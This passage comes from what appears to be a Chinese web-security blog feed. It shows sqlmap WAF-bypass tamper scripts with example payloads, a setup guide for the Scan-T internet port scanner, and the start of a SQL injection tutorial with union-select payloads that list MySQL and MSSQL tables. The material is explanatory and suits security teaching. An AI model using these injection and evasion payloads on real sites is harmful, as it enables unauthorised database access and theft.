<li>nonrecursivereplacement.py</li>
</ul>
<p>　　双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 UNION SELECT 2--'</span>) <span class="string">'1 UNIOUNIONN SELESELECTCT 2--'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2randomblank.py</li>
</ul>
<p>　　作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users'</span>) <span class="string">'SELECT%0Did%0DFROM%0Ausers'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>sp_password.py</li>
</ul>
<p>　　作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227-- '</span>) <span class="string">'1 AND 9227=9227-- sp\_password'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>chardoubleencode.py</li>
</ul>
<p>　　作用: 双url编码(不处理以编码的)</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD FROM%<span class="number">20</span>TABLE </span><br><span class="line"></span><br><span class="line">Output: %<span class="number">2553</span>%<span class="number">2545</span>%<span class="number">254</span>c%<span class="number">2545</span>%<span class="number">2543</span>%<span class="number">2554</span>%<span class="number">2520</span>%<span class="number">2546</span>%<span class="number">2549</span>%<span class="number">2545</span>%<span class="number">254</span>c%<span class="number">2544</span>%<span class="number">2520</span>%<span class="number">2546</span>%<span class="number">2552</span>%<span class="number">254</span>f%<span class="number">254</span>d%<span class="number">2520</span>%<span class="number">2554</span>%<span class="number">2541</span>%<span class="number">2542</span>%<span class="number">254</span>c%<span class="number">2545</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>unionalltounion.py</li>
</ul>
<p>　　作用：替换UNION ALL SELECT UNION SELECT</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'-1 UNION ALL SELECT'</span>) <span class="string">'-1 UNION SELECT'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>charencode.py</li>
</ul>
<p>　　作用：url编码<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD FROM%<span class="number">20</span>TABLE</span><br><span class="line"></span><br><span class="line">Output: %<span class="number">53</span>%<span class="number">45</span>%<span class="number">4</span>c%<span class="number">45</span>%<span class="number">43</span>%<span class="number">54</span>%<span class="number">20</span>%<span class="number">46</span>%<span class="number">49</span>%<span class="number">45</span>%<span class="number">4</span>c%<span class="number">44</span>%<span class="number">20</span>%<span class="number">46</span>%<span class="number">52</span>%<span class="number">4</span>f%<span class="number">4</span>d%<span class="number">20</span>%<span class="number">54</span>%<span class="number">41</span>%<span class="number">42</span>%<span class="number">4</span>c%<span class="number">45</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>randomcase.py</li>
</ul>
<p>　　作用：随机大小写 Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: INSERT</span><br><span class="line">Output: InsERt</span><br></pre></td></tr></table></figure></p>
<ul>
<li>unmagicquotes.py</li>
</ul>
<p>　　作用：宽字符绕过 GPC addslashes</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span>′ AND <span class="number">1</span>=<span class="number">1</span> </span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span>%bf%<span class="number">27</span> AND <span class="number">1</span>=<span class="number">1</span>–%<span class="number">20</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>randomcomments.py</li>
</ul>
<p>　　作用：用/**/分割sql关键字</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘INSERT’ becomes ‘IN//S//ERT’</span><br></pre></td></tr></table></figure></p>
<ul>
<li>charunicodeencode.py</li>
</ul>
<p>　　作用：字符串 unicode 编码</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD%<span class="number">20</span>FROM TABLE </span><br><span class="line"></span><br><span class="line">Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</span><br></pre></td></tr></table></figure></p>
<ul>
<li>securesphere.py</li>
</ul>
<p>　　作用：追加特制的字符串</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 1=1'</span>) <span class="string">"1 AND 1=1 and '0having'='0having'"</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>versionedmorekeywords.py</li>
</ul>
<p>　　作用：注释绕过</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> UNION ALL SELECT NULL, NULL, CONCAT(CHAR(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"> Output: <span class="number">1</span>/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(<span class="number">32</span>)),/*!CHAR*/(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2comment.py<br>　　作用：Replaces space character (‘ ‘) with comments ‘/**/’</li>
</ul>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT id FROM users </span><br><span class="line"></span><br><span class="line">Output: SELECT//id//FROM/**/users</span><br></pre></td></tr></table></figure></p>
<ul>
<li>halfversionedmorekeywords.py</li>
</ul>
<p>　　作用：关键字前加注释</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: value’ UNION ALL SELECT CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL<span class="comment"># AND ‘QDWa’='QDWa </span></span><br><span class="line"></span><br><span class="line">Output: value’/*!<span class="number">0</span>UNION/*!<span class="number">0</span>ALL/*!<span class="number">0</span>SELECT/*!<span class="number">0</span>CONCAT(/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),/*!<span class="number">0</span>IFNULL(CAST(/*!<span class="number">0</span>CURRENT_USER()/*!<span class="number">0</span>AS/*!<span class="number">0</span>CHAR),/*!<span class="number">0</span>CHAR(<span class="number">32</span>)),/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL<span class="comment">#/*!0AND ‘QDWa’='QDWa</span></span><br></pre></td></tr></table></figure></p>
<h3 id="u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26"><a href="#u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26" class="headerlink" title="有时发现跑出的数据都是毫无意义的字符"></a>有时发现跑出的数据都是毫无意义的字符</h3><p>解决方案：</p>
<p>　　a）SQLMAP会提示你加–hex或者–no-cast，有时会有帮助<br>　　b）如果你用的是time-based注射，建议增加延时–time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境<br>　　c）增加level的数值</p>
<h3 id="u66B4_u529B_u731C_u8868"><a href="#u66B4_u529B_u731C_u8868" class="headerlink" title="暴力猜表"></a>暴力猜表</h3><p>　　针对access站可以构造common-tables.txt</p>
<h3 id="u663E_u793Aunable_to_connect_to_the_target_url"><a href="#u663E_u793Aunable_to_connect_to_the_target_url" class="headerlink" title="显示unable to connect to the target url"></a>显示unable to connect to the target url</h3><p>　　第一个可能是time-out设置的太小，出现问题，再有可能就是WAF直接把请求拦截掉了，因此得不到响应。</p>
<p>有些waf比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应</p>
<p>　　解决方案：减少time-out进行检测，在跑数据时改回time-out</p>
<h3 id="u63D0_u793Apossible_integer_casting_detected"><a href="#u63D0_u793Apossible_integer_casting_detected" class="headerlink" title="提示possible integer casting detected"></a>提示possible integer casting detected</h3><p>　　如果是在手工测试，建议到这里可以停止了，节省时间。</p>
<p>　　如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。</p>
<h3 id="u53C2_u8003_u6587_u732E_uFF1A"><a href="#u53C2_u8003_u6587_u732E_uFF1A" class="headerlink" title="参考文献："></a>参考文献：</h3><p>　　<a href="http://drops.wooyun.org/tools/4760" target="_blank" rel="external">http://drops.wooyun.org/tools/4760</a><br>　　<a href="http://drops.wooyun.org/tips/143" target="_blank" rel="external">http://drops.wooyun.org/tips/143</a><br>　　<a href="http://www.2cto.com/Article/201306/223082.html" target="_blank" rel="external">http://www.2cto.com/Article/201306/223082.html</a><br>　　<a href="http://drops.wooyun.org/tips/5254" target="_blank" rel="external">http://drops.wooyun.org/tips/5254</a></p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Scan-T简介]]></title>
      <url>https://nanshihui.github.io/2016/01/21/ToolForSpider%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>看着自己编写的代码没有说明的确不方便别人开发，便写了部分说明在这边。简单的记录该项目的相关说明。<p></p>
<h3 id="u5173_u4E8EScan-T_u9879_u76EE_u7684_u8BF4_u660E"><a href="#u5173_u4E8EScan-T_u9879_u76EE_u7684_u8BF4_u660E" class="headerlink" title="关于Scan-T项目的说明"></a>关于Scan-T项目的说明</h3><ul>
<li><strong>文件分布:</strong>详细文件分类</li>
<li><strong>功能使用:</strong>大致的功能描述</li>
<li><strong>效果展示:</strong> 初步的界面效果</li>
<li><strong>TODO:</strong> 进一步需要做的事情</li>
<li><strong>其他:</strong> 补充的地方<a id="more"></a>
</li>
</ul>
<h2 id="u7B80_u4ECB"><a href="#u7B80_u4ECB" class="headerlink" title="简介"></a>简介</h2><p>　　Scan-T是一个网络空间指纹扫描工具，用于记录主机上的端口信息。以分布的方式，方便数据的抓取以及呈现，未来将会添加统计以及总结这些数据潜在的意义（暂时思路比较模糊）。有愿意指点我的，可以提供一点思路，谢谢。</p>
<h2 id="u6574_u4F53_u67B6_u6784"><a href="#u6574_u4F53_u67B6_u6784" class="headerlink" title="整体架构"></a>整体架构</h2><p>　　Scan-T的整体架构为nginx+Django+uwsgi,主体语言为python,抓取信息时,使用线程,进程,协程相互配合方式,检索数据使用ES配合redis,提高检索效率.</p>
<h3 id="u9879_u76EE_u5730_u5740"><a href="#u9879_u76EE_u5730_u5740" class="headerlink" title="项目地址"></a>项目地址</h3><p>　　<a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="external">https://github.com/nanshihui/Scan-T</a></p>
<h2 id="u6548_u679C_u5C55_u793A"><a href="#u6548_u679C_u5C55_u793A" class="headerlink" title="效果展示"></a>效果展示</h2><h3 id="u9996_u9875"><a href="#u9996_u9875" class="headerlink" title="首页"></a>首页</h3><p><img src="//nanshihui.github.io/public/main.png" alt="PS-PNG-main"></p>
<h3 id="u68C0_u7D22_u7ED3_u679C"><a href="#u68C0_u7D22_u7ED3_u679C" class="headerlink" title="检索结果"></a>检索结果</h3><p><img src="//nanshihui.github.io/public/result.png" alt="PS-PNG-result"></p>
<h3 id="u540E_u53F0"><a href="#u540E_u53F0" class="headerlink" title="后台"></a>后台</h3><p><img src="//nanshihui.github.io/public/work.png" alt="PS-PNG-work"></p>
<h3 id="u7EDF_u8BA1_u5206_u6790_u9875_u9762"><a href="#u7EDF_u8BA1_u5206_u6790_u9875_u9762" class="headerlink" title="统计分析页面"></a>统计分析页面</h3><p><img src="//nanshihui.github.io/public/analyse.png" alt="PS-PNG-analyse"></p>
<h3 id="u4E3B_u673A_u4F4D_u7F6E_u660E_u7EC6_u9875_u9762"><a href="#u4E3B_u673A_u4F4D_u7F6E_u660E_u7EC6_u9875_u9762" class="headerlink" title="主机位置明细页面"></a>主机位置明细页面</h3><p><img src="//nanshihui.github.io/public/mapshow.png" alt="PS-PNG-analyse"><br><!--### 移动端--><br><!--<div>--><br><!--<img src="http://nanshihui.github.io/public/phone.png" width = "268" height = "480" alt="图片名称" align="center" />--><br><!--</div>--></p>
<h2 id="u6574_u4F53_u601D_u8DEF"><a href="#u6574_u4F53_u601D_u8DEF" class="headerlink" title="整体思路"></a>整体思路</h2><p>　　整个项目是一个分布式的形式。如果在单台机子上，就是一个WEB项目，如果在多台机上面，就是一个主从的运行模式，由主机从用户的输入以及定时产生的任务产生数据，自己在处理数据的同时，如果从机有响应任务请求。主机会将一部分的任务发送给从机。待从机执行完任务后，将结果反馈给主机。主机再将结果返回给用户以及数据库里。由于所有的消息都是异步的，所以在实现的时候，大部分都是异步，以任务的形式分发，执行。</p>
<h2 id="u5B89_u88C5_u65B9_u6CD5"><a href="#u5B89_u88C5_u65B9_u6CD5" class="headerlink" title="安装方法"></a>安装方法</h2><h3 id="Prepare_the_environment"><a href="#Prepare_the_environment" class="headerlink" title="Prepare the environment"></a>Prepare the environment</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install -y nmap</span><br><span class="line">apt-get install -y libjson-c-dev libjson-c2  libjson0 libjson0-dev</span><br><span class="line">apt-get install -y redis-server zmap libffi-dev libssl-dev python-pip libmysqlclient-dev</span><br><span class="line">apt-get install -y wget unzip</span><br><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure>
<h3 id="Get_the_code"><a href="#Get_the_code" class="headerlink" title="Get the code"></a>Get the code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/nanshihui/Scan-T/archive/master.zip</span><br><span class="line">unzip master.zip </span><br><span class="line"><span class="built_in">cd</span> Scan-T-master/</span><br></pre></td></tr></table></figure>
<h3 id="Install_package"><a href="#Install_package" class="headerlink" title="Install package"></a>Install package</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pip install MySQL-python</span><br><span class="line">pip install BeautifulSoup==<span class="number">3.2</span>.<span class="number">1</span></span><br><span class="line">pip install beautifulsoup4==<span class="number">4.4</span>.<span class="number">1</span></span><br><span class="line">pip install Django==<span class="number">1.9</span></span><br><span class="line">pip install python-nmap==<span class="number">0.5</span>.<span class="number">0</span>.post1</span><br><span class="line">pip install DBUtils==<span class="number">1.1</span></span><br><span class="line">pip install paramiko==<span class="number">1.16</span>.<span class="number">0</span></span><br><span class="line">pip install ruamel.ordereddict==<span class="number">0.4</span>.<span class="number">9</span></span><br><span class="line">pip install scapy==<span class="number">2.3</span>.<span class="number">2</span></span><br><span class="line">pip install scapy-http==<span class="number">1.7</span></span><br><span class="line">pip install objgraph==<span class="number">2.0</span>.<span class="number">1</span></span><br><span class="line">pip install pycrypto==<span class="number">2.6</span>.<span class="number">1</span></span><br><span class="line">pip install dozer</span><br><span class="line">pip install faulthandler</span><br><span class="line">pip install apscheduler</span><br></pre></td></tr></table></figure>
<h3 id="Set_the_mysql_config"><a href="#Set_the_mysql_config" class="headerlink" title="Set the mysql config"></a>Set the mysql config</h3><ul>
<li>create table</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p <span class="operator">-e</span> <span class="string">'create database datap'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>change password</li>
</ul>
<p>change you sql password both in spidermanage/spidertool/config.py<br>toolforspider/spidermanage/spidermanage/settings.py</p>
<ul>
<li>import the data structure</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p datap <span class="operator">-e</span> <span class="string">'source /toolforspider-master/spidermanage/sqldata/Dump20160331.sql'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>add your username</li>
</ul>
<p>add your username and password in usertable</p>
<h3 id="Add_css_file"><a href="#Add_css_file" class="headerlink" title="Add css file"></a>Add css file</h3><ul>
<li>PATH:/toolforspider-master/spidermanage/common_static/nmaptool/css/bootstrap/ </li>
</ul>
<p>create floder named lib and download css below<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://cine9deabril.com.br/fn/jquery/jquery-ui-<span class="number">1.10</span>.<span class="number">2</span>.custom/css/custom-theme/jquery-ui-<span class="number">1.10</span>.<span class="number">2</span>.custom.css</span><br><span class="line">https://cdnjs.cloudflare.com/ajax/libs/font-awesome/<span class="number">4.6</span>.<span class="number">3</span>/css/font-awesome.css</span><br></pre></td></tr></table></figure></p>
<h3 id="Add_logfile"><a href="#Add_logfile" class="headerlink" title="Add logfile"></a>Add logfile</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mkdir spidermanage/lib/</span><br><span class="line">touch spidermanage/lib/__init__.py</span><br></pre></td></tr></table></figure>
<p>add the following code to spidermanage/lib/logger.py </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">def initLog(logfile, level=<span class="number">2</span>, verbose=False):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span><br><span class="line">    日志记录函数，日志等级默认为2，即INFO级别的日志</span><br><span class="line">    verbose - 是否屏幕输出，默认False</span><br><span class="line">    '</span><span class="string">''</span></span><br><span class="line">    <span class="built_in">log</span>Level = logging.INFO</span><br><span class="line">    <span class="keyword">if</span> level == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.NOTSET</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.DEBUG</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.INFO</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.WARNING</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.ERROR</span><br><span class="line">    <span class="keyword">elif</span> level == <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">log</span>Level = logging.CRITICAL</span><br><span class="line">    logger = logging.getLogger(<span class="string">'pocdect'</span>)</span><br><span class="line">    console = logging.FileHandler(logfile)</span><br><span class="line">    formatter = logging.Formatter(<span class="string">'[%(asctime)s]%(filename)s-%(process)d-%(thread)d-%(lineno)d-%(levelname)8s-"%(message)s"'</span>,<span class="string">'%Y-%m-%d %a %H:%M:%S'</span>)</span><br><span class="line">    console.setFormatter(formatter)</span><br><span class="line">    logger.addHandler(console)</span><br><span class="line">    logger.setLevel(<span class="built_in">log</span>Level)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        console = logging.StreamHandler()</span><br><span class="line">        console.setLevel(<span class="built_in">log</span>Level)  <span class="comment"># always debug mode to screen</span></span><br><span class="line">        formatter = logging.Formatter(<span class="string">'%(name)-8s: %(levelname)-8s %(message)s'</span>)</span><br><span class="line">        console.setFormatter(formatter)</span><br><span class="line">        logger.addHandler(console)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> logger</span><br></pre></td></tr></table></figure>
<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python spidermanage/manage.py runserver <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span> --insecure</span><br></pre></td></tr></table></figure>
<h2 id="u4F7F_u7528_u65B9_u6CD5"><a href="#u4F7F_u7528_u65B9_u6CD5" class="headerlink" title="使用方法"></a>使用方法</h2><p>  软件不需要用户手动的创建任务便会在后台随机产生任务,并在互联网上抓取,也可以直接创建任务抓取信息.<br>　　暂时先这样，未完待续。。。</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Nmap </tag>
            
            <tag> Python </tag>
            
            <tag> Zmap </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入总结（一）]]></title>
      <url>https://nanshihui.github.io/2016/01/19/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>习惯sqlmap方便的的同时，会不知不觉依赖上，差点忘了根本，遂总结了一下，提醒自己<p></p>
<h3 id="u5E38_u89C1_u7684SQL_u6CE8_u5165_u5F62_u5F0F"><a href="#u5E38_u89C1_u7684SQL_u6CE8_u5165_u5F62_u5F0F" class="headerlink" title="常见的SQL注入形式"></a>常见的SQL注入形式</h3><ul>
<li><strong>读取数据库内容常用方式:</strong>　information_schema，mysql.user</li>
<li><strong>有回显的函数错误提示:</strong> 有SQL错误显示；</li>
<li><strong>无回显的函数错误提示:</strong> 盲注，即没有有SQL错误显示；</li>
<li><strong>加密形式:</strong> SQL加密执行显示;</li>
<li><strong>其他形式:</strong> 宽字节注入等;</li>
<li><strong>预防措施:</strong> 如何避免；</li>
<li><strong>常用函数:</strong> sql自带的函数；</li>
<li><strong>其他:</strong> 补充的地方；</li>
</ul>
<a id="more"></a>
<h2 id="u8BFB_u53D6_u6570_u636E_u5E93_u5185_u5BB9_u5E38_u7528_u65B9_u5F0F"><a href="#u8BFB_u53D6_u6570_u636E_u5E93_u5185_u5BB9_u5E38_u7528_u65B9_u5F0F" class="headerlink" title="读取数据库内容常用方式"></a>读取数据库内容常用方式</h2><p>　　数据库都会有内置的表，里面已经包含了所有建表的信息。以MySQL为例。在５版本以上的数据库使用如下语句，就可以直接获得数据库的表的信息。</p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>　　比如在MySQL下有<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(distinct table_name) from information_schema.columns <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure></p>
<p>　　不理解的话，可以直接查阅MySQL的information_schema.columns表就会清楚。相关的字段有 table_name，table_schema，column_name。<br>　　mysql.user表相应的字段就会有User,Password.<br>　　通过这些方式我们大概就可以知道目标数据库，所应有的表信息，就可以进行相应的操作。注释的话比如–,#,/*等</p>
<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>　　在MSSQL下<br>　　在开始前我们先来认识下默认系统表—sysdatabases。sysdatabases是MSSQL默认系统表，包含“master”，“msdb”，“mssqlweb”，“empdb”，“model”这五个表，对应的bdid的值为1到5，用户新建的数据库从bdid=6开始，我们可以通过修改bdid的值来得出库名，语句为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases <span class="built_in">where</span> dbid=<span class="number">1</span></span><br><span class="line">union select name from yourdatabasename.dbo.sysobjects <span class="built_in">where</span> xtype=char(<span class="number">85</span>) and name not <span class="keyword">in</span> (select top XX name from yourdatabasename.dbo.sysobjects <span class="built_in">where</span> xtype=char(<span class="number">85</span>))--</span><br></pre></td></tr></table></figure></p>
<p>　　上面的XX为数字，即表的序号，为数字。通过这种方式获得表名，接下来就是字段名。<br>　　然后分开两个步骤：<br>　　１.获得表段的总序号（与id不同）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select id from yourdatabasename.dbo.sysobjects <span class="built_in">where</span> xtype=char(<span class="number">85</span>) and name not <span class="keyword">in</span> (select top XX name from yourdatabasename.dbo.sysobjects <span class="built_in">where</span> xtype=char(<span class="number">85</span>))--</span><br></pre></td></tr></table></figure></p>
<p>　　２.根据表的序号一个个列出字段的名字<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select name from yourdatabasename.dbo.syscolumns <span class="built_in">where</span> ID=<span class="number">2073058421</span> and name not <span class="keyword">in</span> (select top XX name from yourdatabasename.dbo.syscolumns <span class="built_in">where</span> ID=<span class="number">2073058421</span> )--</span><br></pre></td></tr></table></figure></p>
<p>　　这里的ID是通过上面的步骤得出来的。<br>　　其他技巧在针对字符输入的时候，由于不能使用引号可以采用如下方式:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://******?ID=<span class="number">1</span>/**/And/**/(/**/select/**/top/**/<span class="number">1</span>/**/name/**/from/**/</span><br><span class="line">(/**/select/**/row_number()/**/over(/**/order/**/by/**/object_id)/**/as/**/rownumber,</span><br><span class="line">*/**/from/**/Web.sys.all_objects/**/</span><br><span class="line"><span class="built_in">where</span>/**/<span class="built_in">type</span>=char(<span class="number">85</span>))A/**/<span class="built_in">where</span>/**/rownumber=<span class="number">1</span>)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
